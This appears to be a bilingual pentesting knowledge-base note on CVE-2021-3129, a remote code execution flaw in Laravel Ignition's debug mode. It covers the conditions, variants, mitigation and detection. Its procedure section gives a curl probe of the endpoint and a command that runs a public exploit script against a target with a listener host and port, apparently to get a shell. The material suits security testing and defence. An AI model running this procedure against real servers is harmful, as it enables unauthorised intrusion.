---
topic: Laravel Ignition RCE (CVE-2021-3129)
tags: [web, laravel, ignition, cve-2021-3129, php, deserialization]
---

# Laravel Ignition RCE (CVE-2021-3129)

**English** | [🇪🇸 Español](laravel-ignition-rce.md)

## Concept

Laravel with Ignition in debug mode exposes `_ignition/execute-solution`. Missing validation allows writing a PHAR file and deserialising it, executing PHP. Exploitation requires `APP_DEBUG=true` and a vulnerable Ignition (< 2.5.2).

## When it applies

- Laravel with `APP_DEBUG=true`.
- Ignition before 2.5.2.
- `_ignition/execute-solution` is reachable.
- The server can write to `storage/logs` or similar.

## Requirements

1. Application URL.
2. Debug mode confirmed (detailed error page).
3. Ability to write a PHAR and force deserialisation.
4. Knowledge of the project path.

## Procedure

Confirm the endpoint:

```bash
curl -s http://<HOST>/_ignition/execute-solution
```

Use a public exploit that:

1. Clears logs and writes a PHAR payload.
2. Sends a request with `solution` and `parameters` to deserialise.
3. Runs commands through a Laravel gadget.

```bash
python3 CVE-2021-3129.py http://<HOST> <LHOST> <LPORT>
```

## Variants

- **PHAR deserialization**: the classic vector.
- **Log poisoning + PHP filter**: write variants.
- **Ignition 1.x**: different endpoints and gadgets.
- **Laravel 8/9**: confirm version and dependencies.

## Limitations

- Requires `APP_DEBUG=true`.
- Ignition 2.5.2+ fixes validation.
- A WAF may block `_ignition`.
- The write path must be accessible.

## Mitigation

- Update Ignition to 2.5.2+ and Laravel.
- Disable `APP_DEBUG` in production.
- Block `_ignition` and `execute-solution`.
- Restrict writes in `storage`.

## Detection

- Requests to `_ignition/execute-solution`.
- 500 errors with detailed traces.
- Anomalous writes in `storage/logs`.
- PHP processes with outbound connections.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell).

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2021-3129>
- <https://github.com/ambionics/laravel-exploits>
- <https://laravel.com/docs/9.x/errors>
